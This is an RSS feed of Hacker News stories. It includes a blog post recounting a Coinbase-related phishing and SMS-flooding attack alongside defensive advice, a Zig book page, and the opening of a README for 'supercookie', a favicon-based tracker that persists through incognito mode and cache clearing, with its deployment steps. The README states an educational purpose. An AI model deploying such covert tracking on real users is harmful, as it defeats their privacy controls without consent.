<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Sun, 16 Nov 2025 23:30:02 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Peter Thiel sells off all Nvidia stock, stirring bubble fears (141 pts)]]></title>
            <link>https://www.thestreet.com/investing/peter-thiel-dumps-top-ai-stock-stirring-bubble-fears</link>
            <guid>45948477</guid>
            <pubDate>Sun, 16 Nov 2025 21:19:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.thestreet.com/investing/peter-thiel-dumps-top-ai-stock-stirring-bubble-fears">https://www.thestreet.com/investing/peter-thiel-dumps-top-ai-stock-stirring-bubble-fears</a>, See on <a href="https://news.ycombinator.com/item?id=45948477">Hacker News</a></p>
Couldn't get https://www.thestreet.com/investing/peter-thiel-dumps-top-ai-stock-stirring-bubble-fears: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[I have recordings proving Coinbase knew about breach months before disclosure (249 pts)]]></title>
            <link>https://jonathanclark.com/posts/coinbase-breach-timeline.html</link>
            <guid>45948058</guid>
            <pubDate>Sun, 16 Nov 2025 20:18:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jonathanclark.com/posts/coinbase-breach-timeline.html">https://jonathanclark.com/posts/coinbase-breach-timeline.html</a>, See on <a href="https://news.ycombinator.com/item?id=45948058">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
                    <p><img src="https://jonathanclark.com/images/coinbase-breach/hero-timeline.png" alt="Coinbase data breach timeline investigation">
                    </p>
                    
                    <h2>The Call That Changed Everything</h2>
                    
                    <p>On January 7, 2025, at 5:02 PM, I received an email with a subject line that immediately caught my attention:</p>
                    
                    <blockquote>
                        <p><strong>"Order N54HJG3V: Withdrawal of 2.93 ETH initiated. A representative will be in touch shortly before we mark the payment completed"</strong></p>
                    </blockquote>
                    
                    <p>Minutes later, my phone rang. The caller ID showed 1-805-885-0141. An American-sounding woman who identified herself as a Coinbase fraud prevention representative said someone had initiated a large transfer from my account and she was calling to confirm.</p>
                    
                    <p>What happened next was chilling: <strong>She knew my social security number. She knew my Bitcoin balance down to the decimal point. She knew personal details that should have been impossible for a scammer to possess.</strong></p>
                    
                    <p>This wasn't just another phishing attempt. This was something far more sophisticated.</p>

                    <hr>

                    <h2>The Timeline That Doesn't Make Sense</h2>
                    
                    <p>Here's where the story gets interesting‚Äîand troubling:</p>
                    
                    <ul>
                        <li><strong>January 7, 2025:</strong> I was attacked by scammers with detailed personal information</li>
                        <li><strong>January 7, 2025:</strong> I reported the attack to Coinbase security@coinbase.com</li>
                        <li><strong>January 7, 2025 (same day):</strong> Brett Farmer, Head of Trust &amp; Safety, responded: "This report is super robust and gives us a lot to look into. We are investigating this scammer now."</li>
                        <li><strong>January 13, 2025:</strong> I asked Coinbase: "How did the attacker know the balance of my bitcoin holdings?" <em>(No response)</em></li>
                        <li><strong>January 17, 2025:</strong> I followed up again, asking for a reply <em>(No response)</em></li>
                        <li><strong>January 22, 2025:</strong> Still no answer to my critical question <em>(No response)</em></li>
                        <li><strong>January 29, 2025:</strong> I asked again: "Could I please get a response?" <em>(No response)</em></li>
                        <li><strong>May 11, 2025:</strong> Coinbase says they became aware of the breach (when attackers demanded $20M ransom)</li>
                        <li><strong>May 15, 2025:</strong> Coinbase publicly disclosed the breach</li>
                    </ul>
                    
                    <p><strong>That's a four-month gap.</strong></p>
                    
                    <p>For four months, I had concrete evidence that attackers possessed detailed Coinbase customer data. For four months, I repeatedly asked Coinbase to explain how this was possible. And for four months, my questions went unanswered.</p>
                    
                    <p><strong>Coinbase never replied to a single follow-up email after Brett Farmer's initial response.</strong> Despite his promise that they were "investigating this scammer," the most important question‚Äîhow the attacker obtained my private account data‚Äîwas met with complete silence.</p>

                    <hr>

                    <h2>What We Now Know About the Breach</h2>
                    
                    <p>In May 2025, Coinbase finally disclosed what had happened: cybercriminals had bribed overseas customer support contractors‚Äîparticularly employees at TaskUs in India‚Äîto steal sensitive customer data.</p>
                    
                    <p>The compromised information included:</p>
                    <ul>
                        <li>Names, addresses, and phone numbers</li>
                        <li>Email addresses</li>
                        <li>Last four digits of Social Security numbers</li>
                        <li>Government-issued ID images</li>
                        <li>Account balances</li>
                        <li>Transaction histories</li>
                    </ul>
                    
                    <p>Coinbase estimated the financial impact at <strong>$180-400 million</strong>, affecting less than 1% of their customer base. Over 200 TaskUs employees were ultimately terminated.</p>
                    
                    <p>But here's the crucial question: <strong>If attackers were actively using stolen data to target customers in January, when did the actual breach occur? And when did Coinbase first become aware that something was wrong?</strong></p>

                    <hr>

                    <h2>What I Reported to Coinbase</h2>
                    
                    <p>On January 7, 2025, immediately after recognizing the attack, I sent a comprehensive security report to Coinbase's security team. This wasn't a vague complaint‚Äîit was a detailed technical analysis that should have raised immediate red flags about a data breach.</p>
                    
                    <p><strong>My report included:</strong></p>
                    
                    <ul>
                            <li><strong>Full email headers:</strong> Complete technical headers showing the email was routed through Amazon SES (a32-86.smtp-out.amazonses.com), not Coinbase's own mail servers, despite appearing to come from commerce@coinbase.com</li>
                            
                            <li><strong>DKIM signature analysis:</strong> Documentation that while the email passed DKIM validation for both coinbase.com and amazonses.com, the actual sending infrastructure was suspicious</li>
                            
                            <li><strong>The phishing email content:</strong> The complete HTML email with its fake "suspicious activity" warning and fraudulent transaction details (Order N54HJG3V, 2.93 ETH withdrawal)</li>
                            
                            <li><strong>Phone number used:</strong> 1-805-885-0141 (later confirmed to be a Google Voice number)</li>
                            
                            <li><strong>Voice recording:</strong> An audio recording of my second call with the scammer, capturing the entire conversation where she demonstrated knowledge of my personal information</li>
                            
                            <li><strong>Specific data the attacker possessed:</strong> A detailed list of what the scammer knew, including:
                                <ul>
                                    <li>My Social Security number</li>
                                    <li>My exact Bitcoin balance</li>
                                    <li>My account signup date</li>
                                    <li>Driver's license information</li>
                                    <li>The amount of the fabricated "suspicious transfer"</li>
                                </ul>
                            </li>
                            
                            <li><strong>Attack methodology:</strong> Description of their social engineering tactics, including the attempt to get me to move funds to "a cold wallet" by downloading Coinbase Wallet</li>
                            
                            <li><strong>Red flags I identified:</strong> The inability of the caller to authenticate herself, the Google Voice callback number, the lack of any notifications in my actual Coinbase account</li>
                            
                            <li><strong>Post-call SMS flooding:</strong> Documentation that immediately after the call, I received hundreds of spam text messages for random service signups‚Äîa potential attempt to hide legitimate 2FA codes or security alerts in the noise</li>
                    </ul>
                    
                    <p>This wasn't a typical phishing report. <strong>I specifically highlighted that the attacker had access to non-public account information that should have been impossible to obtain without either a device compromise on my end or a data breach at Coinbase.</strong></p>
                    
                    <p>Brett Farmer, Coinbase's Head of Trust &amp; Safety, responded the same day, calling it a "super robust" report that gave them "a lot to look into."</p>
                    
                    <p>But when I followed up six days later with the key question‚Äî<em>"How did the attacker know the balance of my bitcoin holdings?"</em>‚Äîthe conversation ended. That question, which should have immediately triggered an internal investigation into potential data compromise, was never answered.</p>

                    <hr>

                    <h2>The Attack: A Perfect Impersonation</h2>
                    
                    <p>The sophistication of this attack cannot be overstated. Let me walk you through what made it so convincing‚Äîand what ultimately saved me.</p>
                    
                    <h3>The Email: Remarkably Convincing</h3>
                    
                    <p>The phishing email I received looked completely legitimate at first glance:</p>
                    
                    <ul>
                        <li><strong>From:</strong> Coinbase Commerce &lt;commerce@coinbase.com&gt;</li>
                        <li><strong>DKIM signatures:</strong> Passed validation for both coinbase.com and amazonses.com</li>
                        <li><strong>Professional formatting:</strong> Perfect HTML layout, correct branding, legitimate-looking transaction details</li>
                        <li><strong>Convincing narrative:</strong> "We detected suspicious activity on your account. A fraud prevention representative will be in touch shortly..."</li>
                    </ul>
                    
                    <p>The email even included what appeared to be a verification code (96841) and assigned me a specific case agent ("Sarah Schueler"). This level of detail gave it tremendous credibility.</p>
                    
                    <h3>The Critical Red Flag: Amazon SES</h3>
                    
                    <p>But when I examined the email headers more carefully, I found something suspicious:</p>
                    
                    <pre>Received: from a32-86.smtp-out.amazonses.com (a32-86.smtp-out.amazonses.com. [54.240.32.86])
Return-Path: &lt;01000194436f122c-535a7ce0-f493-41c2-b966-dcaa1a9e6b57-000000@amazonses.com&gt;
                    </pre>
                    
                    <p>The email was sent through <strong>Amazon SES (Simple Email Service)</strong>, not Coinbase's own servers. While Coinbase might use Amazon infrastructure, this raised my suspicion. A legitimate security-critical email about fraud should come through more controlled channels.</p>

                    <h3>The Phone Call: Even More Convincing (And Recorded)</h3>
                    
                    <p>When the woman called me, she was professional, intelligent, and sounded exactly like a legitimate customer service representative. She had information that seemed impossible for a scammer to possess:</p>
                    
                    <ul>
                        <li>My exact Bitcoin balance</li>
                        <li>My account signup date</li>
                        <li>My driver's license details</li>
                        <li>My Social Security number</li>
                        <li>The amount of the "suspicious transfer" (2.93 ETH)</li>
                    </ul>
                    
                    <p>During our conversation, I asked her to authenticate herself. Here's where things got interesting.</p>

                    <hr>

                    <h2>How I Detected It Was a Scam</h2>
                    
                    <p>Despite the sophistication of the attack, several red flags eventually convinced me this was fraudulent:</p>
                    
                    <h3>Red Flag #1: The Authentication Problem</h3>
                    
                    <p>I asked the caller to prove she was from Coinbase. She offered to read me my personal information‚Äîbut I already knew she had that information. That's not authentication; that's just proving she has stolen data.</p>
                    
                    <p>When I suggested she send me an email from a verified Coinbase address that I could reply to, she claimed she didn't have access to personal email addresses and could only use generic support channels. <strong>A fraud prevention specialist without the ability to send verified emails? That didn't add up.</strong></p>
                    
                    <h3>Red Flag #2: The Callback Issue</h3>
                    
                    <p>When I asked if I could call her back, she said I couldn't reach her because she was "in the fraud department." After the call, I tried calling the number back: <strong>it was a Google Voice number.</strong></p>
                    
                    <p>Legitimate financial institutions always provide callback numbers that route to their main systems. A Google Voice number is a massive red flag.</p>
                    
                    <h3>Red Flag #3: Email Verification Confusion</h3>
                    
                    <p>When I challenged the authenticity of the email sender, the caller insisted that Amazon was just Coinbase's "service provider" and that the DKIM signatures proved legitimacy. But when pressed, she couldn't explain away the anomalies in a satisfactory way.</p>
                    
                    <p>The conversation on the recorded call shows my growing skepticism:</p>
                    
                    <blockquote>
                        <p><strong>Me:</strong> "I don't think there is enough information provided for me to authenticate you."</p>
                        <p><strong>Caller:</strong> "I'm not sure what you would like me to do..."</p>
                        <p><strong>Me:</strong> "There are just too many red flags."</p>
                    </blockquote>
                    
                    <h3>Red Flag #4: No Notifications in My Account</h3>
                    
                    <p>After the call, I logged into my actual Coinbase account. There were:</p>
                    <ul>
                        <li>No notifications about the alleged transfer</li>
                        <li>No new login attempts</li>
                        <li>No new authorized devices</li>
                        <li>No actual transaction matching what the caller described</li>
                    </ul>
                    
                    <p>If this were real, there would have been notifications everywhere.</p>
                    
                    <h3>Red Flag #5: The Pressure to Use Coinbase Wallet</h3>
                    
                    <p>The caller wanted me to move my cryptocurrency to "a cold wallet" and started walking me through downloading Coinbase Wallet. <strong>This is a classic social engineering tactic‚Äîget the victim to move funds to an address controlled by the attacker.</strong></p>
                    
                    <p>I didn't follow through, so I never discovered exactly how they planned to steal the funds, but the intent was clear.</p>

                    <hr>

                    <h2>The SMS Flooding Attack: A Sinister Twist</h2>
                    
                    <p>Here's where things got even more concerning. Immediately after I ended the call with the scammer, <strong>my phone was bombarded with hundreds of text messages‚Äîrandom service signups, verification codes, newsletters, everything imaginable.</strong></p>
                    
                    <p>At first, I thought this was just a vindictive "FU" from the scammer. But the timing and volume suggest something more calculated: <strong>SMS flooding is a known technique to hide legitimate security alerts in noise.</strong></p>
                    
                    <p>The attack works like this:</p>
                    <ol>
                        <li>Scammer floods your phone with spam texts</li>
                        <li>While you're overwhelmed, they attempt account takeovers on various services</li>
                        <li>Real 2FA codes and security alerts get buried in the flood</li>
                        <li>You miss the critical warnings because they're hidden among hundreds of spam messages</li>
                    </ol>
                    
                    <p>This could have been an attempt to:</p>
                    <ul>
                        <li>Hijack my SMS-based two-factor authentication</li>
                        <li>Hide real alerts from Coinbase or other services</li>
                        <li>Overwhelm me while they attempted unauthorized access to various accounts</li>
                        <li>Create confusion and distract from their next moves</li>
                    </ul>
                    
                    <p><strong>This wasn't just a phishing call‚Äîit was a coordinated, multi-vector attack.</strong></p>

                    <hr>

                    <h2>What Coinbase Got Wrong</h2>
                    
                    <p>Coinbase's handling of this breach raises serious questions:</p>
                    
                    <h3>1. Outsourcing Security-Sensitive Roles</h3>
                    
                    <p>Customer support agents at third-party contractors had access to extremely sensitive data: Social Security numbers, account balances, transaction histories, and personal documents. <strong>Why were overseas contractors given such privileged access?</strong></p>
                    
                    <p>The economics of the bribery scheme tell the story: attackers likely paid relatively small amounts to contractors earning modest wages to access data they then used to attempt thefts worth potentially millions.</p>
                    
                    <h3>2. Failed Detection Systems</h3>
                    
                    <p>Coinbase claims they "discovered" the breach on May 11, 2025, when attackers attempted to extort $20 million. But my case‚Äîand likely many others‚Äîproves the breach was being actively exploited months earlier.</p>
                    
                    <p><strong>What monitoring systems failed to detect that customer data was being used in sophisticated phishing attacks?</strong> I reported this in January with specific details about how the attacker knew my information. That report should have triggered alarm bells.</p>
                    
                    <h3>3. Inadequate Response to User Reports</h3>
                    
                    <p>On January 7, 2025, I submitted a detailed security report to Coinbase. Brett Farmer, Head of Trust &amp; Safety, responded on January 7:</p>
                    
                    <blockquote>
                        <p>"Hey Jonathan, I just wanted to send a personal note and thank you for this information. This report is super robust and gives us a lot to look into. We are investigating this scammer now."</p>
                    </blockquote>
                    
                    <p>But when I followed up with the critical question‚Äî"How did the attacker know the balance of my bitcoin holdings?"‚Äîmy subsequent emails went unanswered:</p>
                    
                    <ul>
                        <li>January 13: "Do you have any updates on this incident?"</li>
                        <li>January 17: "Could I please get a reply on my question below?"</li>
                        <li>January 22: "Could I please get an update to my question as to how the attacker was able to determine my coinbase bitcoin balance?"</li>
                        <li>January 29: "Could I please get a response?"</li>
                    </ul>
                    
                    <p><strong>My question was specific and technical. It went to the heart of what should have been a massive red flag: How did attackers have access to non-public account data?</strong></p>
                    
                    <p>Had Coinbase investigated this seriously in January, they might have discovered the insider threat months earlier and prevented additional victims.</p>
                    
                    <h3>4. The Disclosure Timeline</h3>
                    
                    <p>Coinbase says they "became aware" of the breach on May 11, 2025. But my January attack proves the breach was active at least four months earlier. This raises uncomfortable questions:</p>
                    
                    <ul>
                        <li>When did the actual data exfiltration occur? Late 2024?</li>
                        <li>How many other victims reported similar attacks between January and May?</li>
                        <li>Were those reports properly escalated and investigated?</li>
                        <li>Would Coinbase have disclosed the breach if not for the extortion attempt?</li>
                    </ul>

                    <hr>

                    <h2>Lessons Learned: How to Protect Yourself</h2>
                    
                    <p>The sad reality is that when a major platform gets breached, your personal information may already be in attackers' hands. But you can still protect yourself from falling victim to the scams that follow:</p>
                    
                    <h3>1. Never Trust Caller ID</h3>
                    
                    <p>Phone numbers can be spoofed. Even if the caller ID shows a legitimate company, don't trust it. Always hang up and call back using a number you independently verify (from the company's official website, not from the email or caller).</p>
                    
                    <p><strong>Pro tip:</strong> Ask the caller for their callback number, then look up that number online before calling it back. Search for "[phone number] scam" or "[phone number] reviews" to see if others have reported it as fraudulent. In my case, when I called back the number the scammer gave me (1-805-885-0141), it turned out to be a Google Voice number‚Äîan instant red flag. Legitimate corporate support lines won't use Google Voice.</p>
                    
                    <h3>2. Understand That Scammers May Have Your Personal Info</h3>
                    
                    <p>In the age of massive data breaches, assume attackers may know:</p>
                    <ul>
                        <li>Your name, address, phone number, email</li>
                        <li>Last 4 digits of your SSN</li>
                        <li>Your account balances and transaction history</li>
                        <li>Other "secret" information you thought was secure</li>
                    </ul>
                    
                    <p><strong>Just because someone knows this information doesn't mean they're legitimate.</strong> Authentication needs to work both ways.</p>
                    
                    <h3>3. Verify Email Headers</h3>
                    
                    <p>Learn to check email headers. Look for:</p>
                    <ul>
                        <li>The actual sending server (not just the "From" address)</li>
                        <li>SPF, DKIM, and DMARC validation results</li>
                        <li>Unusual routing or relay servers</li>
                    </ul>
                    
                    <p>In my case, the Amazon SES sending address was the tip-off, even though DKIM signatures technically validated.</p>
                    
                    <p><strong>Pro tip:</strong> If you're not sure how to interpret email headers, copy the full headers and paste them into a good AI assistant (like ChatGPT or Claude) and ask: "Analyze these email headers and tell me if there are any red flags or signs this could be a phishing email." AI tools are excellent at spotting anomalies in technical data like email routing.</p>
                    
                    <h3>4. Demand Proper Authentication</h3>
                    
                    <p>If someone calls claiming to be from your bank, exchange, or other financial institution, <strong>they should be able to authenticate themselves to you, not just read back information they already have.</strong></p>
                    
                    <p>Legitimate companies can:</p>
                    <ul>
                        <li>Send you emails from verified domain addresses you can reply to</li>
                        <li>Provide callback numbers that route through their main system</li>
                        <li>Verify their identity through the app or website you're already logged into</li>
                    </ul>
                    
                    <h3>5. Check Your Account Directly</h3>
                    
                    <p>If someone alerts you to suspicious activity, don't trust the email or call. Open a browser, type in the company's URL directly (don't click links), log in, and check for yourself. If there's really a problem, it will show up in your account.</p>
                    
                    <h3>6. Never Move Funds Under Pressure</h3>
                    
                    <p>Legitimate companies will never pressure you to immediately move your funds, download software, or take urgent action to "protect" your account. <strong>That pressure is the scam.</strong></p>
                    
                    <h3>7. Use App-Based or Hardware 2FA, Not SMS</h3>
                    
                    <p>My experience with SMS flooding shows why SMS-based two-factor authentication is vulnerable. Use:</p>
                    <ul>
                        <li>Hardware security keys (YubiKey, Titan)</li>
                        <li>Authenticator apps (Google Authenticator, Authy)</li>
                        <li>Platform-specific authentication (like Coinbase's app-based approval)</li>
                    </ul>
                    
                    <p>SMS can be hijacked, flooded, or intercepted.</p>
                    
                    <h3>8. Report Everything</h3>
                    
                    <p>If you're targeted by a sophisticated attack, report it immediately and provide as much detail as possible:</p>
                    <ul>
                        <li>Full email headers</li>
                        <li>Phone numbers used</li>
                        <li>Specific information the attacker knew</li>
                        <li>Recording of calls if possible (check your local laws)</li>
                    </ul>
                    
                    <p>Your report might be the data point that helps the company detect a breach.</p>

                    <hr>

                    <h2>The Bigger Picture</h2>
                    
                    <p>My case represents just one data point in what appears to be a months-long campaign of attacks enabled by the Coinbase breach. How many other customers were targeted between January and May? How many fell for these scams because they didn't catch the red flags I did?</p>
                    
                    <p>Coinbase has committed to reimbursing customers who were defrauded. But the $180-400 million estimated cost of this breach doesn't just represent reimbursements‚Äîit represents the human cost of trust betrayed, security compromised, and warnings ignored.</p>
                    
                    <p>The cryptocurrency industry promises decentralization and security, but incidents like this expose the risks of centralized custody. When you trust an exchange with your assets and personal information, you're trusting their security practices, their contractor oversight, and their incident response capabilities.</p>
                    
                    <p>In this case, that trust was misplaced.</p>

                    <hr>

                    <h2>Unanswered Questions</h2>
                    
                    <p>Four months after my attack, and several months after Coinbase's disclosure, key questions remain:</p>
                    
                    <ol>
                        <li><strong>When did the actual breach occur?</strong> My January attack suggests late 2024 at the latest.</li>
                        
                        <li><strong>How many customers were targeted before May 2025?</strong> Am I one of dozens? Hundreds? Thousands?</li>
                        
                        <li><strong>What happened to the user reports filed between January and May?</strong> Were they properly investigated and escalated?</li>
                        
                        <li><strong>Why wasn't the connection made between user reports of sophisticated phishing and a potential data breach?</strong></li>
                        
                        <li><strong>What specific access controls failed that allowed overseas contractors to exfiltrate sensitive data?</strong></li>
                        
                        <li><strong>Will there be regulatory consequences for the delayed disclosure?</strong> SEC rules require timely reporting of material cybersecurity incidents.</li>
                        
                        <li><strong>How can users trust that the security improvements Coinbase claims to have made are actually effective?</strong></li>
                    </ol>

                    <hr>

                    <h2>Conclusion: The Timeline Matters</h2>
                    
                    <p>The discrepancy between my January attack and Coinbase's May disclosure isn't just an interesting footnote‚Äîit's a critical part of understanding what went wrong and who bears responsibility.</p>
                    
                    <p>My emails, timestamped and documented, prove that:</p>
                    <ul>
                        <li>The breach was being actively exploited months before Coinbase's "discovery"</li>
                        <li>A customer reported detailed evidence of the attack and asked specific questions about data compromise</li>
                        <li>Those questions went unanswered for months</li>
                        <li>The breach was only disclosed after attackers attempted extortion</li>
                    </ul>
                    
                    <p><strong>I was one of the lucky ones‚ÄîI detected the scam and didn't lose funds. But how many others weren't so fortunate during those four months of silence?</strong></p>
                    
                    <p>Coinbase's Head of Trust &amp; Safety called my initial report "super robust" and said it gave them "a lot to look into." But when I asked the one question that mattered most‚Äîhow did the attacker have my data?‚Äîthe company went silent.</p>
                    
                    <p>That silence lasted 120 days.</p>
                    
                    <p>And that's the real story behind the $400 million breach.</p>

                    <hr>

                    <hr>

                    
                </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[62 chapter open-source Zig book (252 pts)]]></title>
            <link>https://www.zigbook.net</link>
            <guid>45947810</guid>
            <pubDate>Sun, 16 Nov 2025 19:44:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.zigbook.net">https://www.zigbook.net</a>, See on <a href="https://news.ycombinator.com/item?id=45947810">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><div><p><img alt="Zig Logo" loading="lazy" width="240" height="240" decoding="async" data-nimg="1" src="https://www.zigbook.net/assets/zig-logo-light.svg"></p></div><div><h2>Learning Zig is not just about adding a language to your resume.</h2><p>It is about fundamentally changing how you think about software.</p></div><div><p>‚ÄúYou came for syntax.</p><p>You'll leave with a philosophy.‚Äù</p></div><p>61 chapters ‚Ä¢ Project-based ‚Ä¢ Zero AI ‚Ä¢ Written by @zigbook</p></div><div><div><div><p>zsh ‚Äî zigbook.net</p></div><div><p>Welcome to Zigbook ü¶é</p><p>Ready to transform how you think about software?</p><p>Exec: zig build zigbook</p><p><span>zigbook %</span><span>$ </span><span></span><span></span></p></div></div><div><p><span></span><span>Interactive terminal ‚Ä¢ Type to get started</span></p></div></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Tracking users with favicons, even in incognito mode (141 pts)]]></title>
            <link>https://github.com/jonasstrehle/supercookie</link>
            <guid>45947770</guid>
            <pubDate>Sun, 16 Nov 2025 19:39:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/jonasstrehle/supercookie">https://github.com/jonasstrehle/supercookie</a>, See on <a href="https://news.ycombinator.com/item?id=45947770">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto">
  <a href="https://supercookie.me/" rel="nofollow">
    <img src="https://camo.githubusercontent.com/272799d3dd981f0335a930bb7fdd97a41e4fc62c9187d81554e75eaf36a1454b/687474703a2f2f7375706572636f6f6b69652e6d652f66617669636f6e2e69636f" alt="supercookie" width="100" data-canonical-src="http://supercookie.me/favicon.ico">
  </a>
</p>
<p dir="auto">
  <a href="https://supercookie.me/workwise" rel="nofollow">
    <img src="https://camo.githubusercontent.com/67ee1d2e8c25f7351ef75ee2d8216e9c291a9a05fb1e704f6dcba15b304e9591/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f63732d7375706572636f6f6b69652e6d652d626c7565" alt="Documentation" data-canonical-src="https://img.shields.io/badge/Docs-supercookie.me-blue">
  </a>
</p>
<p dir="auto">
  <a href="https://supercookie.me/" rel="nofollow">
    <img src="https://camo.githubusercontent.com/4cb18353ec402c26cf260f19f13b6efa92ac311d6bb8ca84c9c24d8d6212bc79/68747470733a2f2f696d672e736869656c64732e696f2f776562736974653f646f776e5f6d6573736167653d646f776e2675705f636f6c6f723d677265656e2675705f6d6573736167653d6f6e6c696e652675726c3d68747470732533412532462532467375706572636f6f6b69652e6d65" alt="Website Status" data-canonical-src="https://img.shields.io/website?down_message=down&amp;up_color=green&amp;up_message=online&amp;url=https%3A%2F%2Fsupercookie.me">
  </a>
  <a href="https://github.com/jonasstrehle/supercookie">
    <img src="https://camo.githubusercontent.com/a9e94c5827d8c06fb55a38a8f40c576b49c700abbf9e6d891bb9bb9363c21e17/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f6a6f6e617373747265686c652f7375706572636f6f6b6965" alt="License" data-canonical-src="https://img.shields.io/github/license/jonasstrehle/supercookie">
  </a>
</p>
<p dir="auto">
  <a href="https://supercookie.me/" rel="nofollow">
    <img src="https://camo.githubusercontent.com/eaca07141f165dcac60511c41ebac7b86b98b5bc283de0edbb64fb8925b93e7f/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f64796e616d69632f6a736f6e3f6c6162656c3d46696e6765727072696e74732671756572793d696e6465782675726c3d68747470733a2f2f7375706572636f6f6b69652e6d652f61706926636f6c6f723d79656c6c6f77" alt="Fingerprint index" data-canonical-src="https://img.shields.io/badge/dynamic/json?label=Fingerprints&amp;query=index&amp;url=https://supercookie.me/api&amp;color=yellow">
  </a>
  <a href="https://supercookie.me/" rel="nofollow">
    <img src="https://camo.githubusercontent.com/4cf682487e2cfda7f137cd5530457eb3423a8cd14da04558b1f9687af527dbee/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f64796e616d69632f6a736f6e3f6c6162656c3d43757272656e742532307265646972656374732671756572793d626974732675726c3d68747470733a2f2f7375706572636f6f6b69652e6d652f61706926636f6c6f723d79656c6c6f77" alt="N Redirects" data-canonical-src="https://img.shields.io/badge/dynamic/json?label=Current%20redirects&amp;query=bits&amp;url=https://supercookie.me/api&amp;color=yellow">
  </a>
</p>
<p dir="auto"><strong>Supercookie</strong> uses favicons to assign a unique identifier to website visitors.<br>
Unlike traditional tracking methods, this ID can be stored almost persistently and cannot be easily cleared by the user.</p>
<p dir="auto">The tracking method works even in the browser's incognito mode and is not cleared by flushing the cache, closing the browser or restarting the operating system, using a VPN or installing AdBlockers. üçø <a href="https://supercookie.me/" rel="nofollow">Live demo</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">About</h2><a id="user-content-about" aria-label="Permalink: About" href="#about"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">üí≠ Inspiration</h3><a id="user-content--inspiration" aria-label="Permalink: üí≠ Inspiration" href="#-inspiration"></a></p>
<ul dir="auto">
<li>Paper by Scientists at University of Illinois, Chicago: <a href="https://www.cs.uic.edu/~polakis/papers/solomos-ndss21.pdf" rel="nofollow">www.cs.uic.edu</a></li>
<li>Article by heise: <a href="https://heise.de/-5027814" rel="nofollow">heise.de</a></li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">üå± Purpose</h3><a id="user-content--purpose" aria-label="Permalink: üå± Purpose" href="#-purpose"></a></p>
<p dir="auto">This repository is for <strong>educational</strong> and <strong>demonstration purposes</strong> only!</p>
<p dir="auto">The demo of "supercookie" as well as the publication of the source code of this repository is intended to draw attention to the problem of tracking possibilities using favicons.</p>
<p dir="auto">üìï <a href="https://supercookie.me/workwise" rel="nofollow">Full documentation</a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">üîß Docker</h3><a id="user-content--docker" aria-label="Permalink: üîß Docker" href="#-docker"></a></p>
<p dir="auto"><strong>requirements</strong>:
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3ac73afa62552f6bcf98b1268be81caf0c30941316ba690664ae87980e16048f/68747470733a2f2f7777772e646f636b65722e636f6d2f77702d636f6e74656e742f75706c6f6164732f323032322f30332f766572746963616c2d6c6f676f2d6d6f6e6f6368726f6d617469632e706e67"><img src="https://camo.githubusercontent.com/3ac73afa62552f6bcf98b1268be81caf0c30941316ba690664ae87980e16048f/68747470733a2f2f7777772e646f636b65722e636f6d2f77702d636f6e74656e742f75706c6f6164732f323032322f30332f766572746963616c2d6c6f676f2d6d6f6e6f6368726f6d617469632e706e67" width="12" data-canonical-src="https://www.docker.com/wp-content/uploads/2022/03/vertical-logo-monochromatic.png"></a> <a href="https://docs.docker.com/get-docker/" rel="nofollow">Docker daemon</a></p>
<ol dir="auto">
<li>Clone repository</li>
</ol>
<div dir="auto" data-snippet-clipboard-copy-content="git clone https://github.com/jonasstrehle/supercookie"><pre>git clone https://github.com/jonasstrehle/supercookie</pre></div>
<ol start="2" dir="auto">
<li>Update .env file in <a href="https://github.com/jonasstrehle/supercookie/blob/main/server/.env">supercookie/server/.env</a></li>
</ol>
<div dir="auto" data-snippet-clipboard-copy-content="HOST_MAIN=yourdomain.com #or localhost:10080
PORT_MAIN=10080

HOST_DEMO=demo.yourdomain.com #or localhost:10081
PORT_DEMO=10081"><pre><span>HOST_MAIN</span><span>=</span><span>yourdomain.com</span> <span><span>#</span>or localhost:10080</span>
<span>PORT_MAIN</span><span>=</span><span>10080</span>

<span>HOST_DEMO</span><span>=</span><span>demo.yourdomain.com</span> <span><span>#</span>or localhost:10081</span>
<span>PORT_DEMO</span><span>=</span><span>10081</span></pre></div>
<ol start="3" dir="auto">
<li>Run container</li>
</ol>
<div dir="auto" data-snippet-clipboard-copy-content="cd supercookie/server
docker-compose up"><pre><span>cd</span> supercookie/server
docker-compose up</pre></div>
<p dir="auto">-&gt; Webserver will be running at <a href="https://yourdomain.com/" rel="nofollow">https://yourdomain.com</a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">ü§ñ Local machine</h3><a id="user-content--local-machine" aria-label="Permalink: ü§ñ Local machine" href="#-local-machine"></a></p>
<p dir="auto"><strong>requirements</strong>:
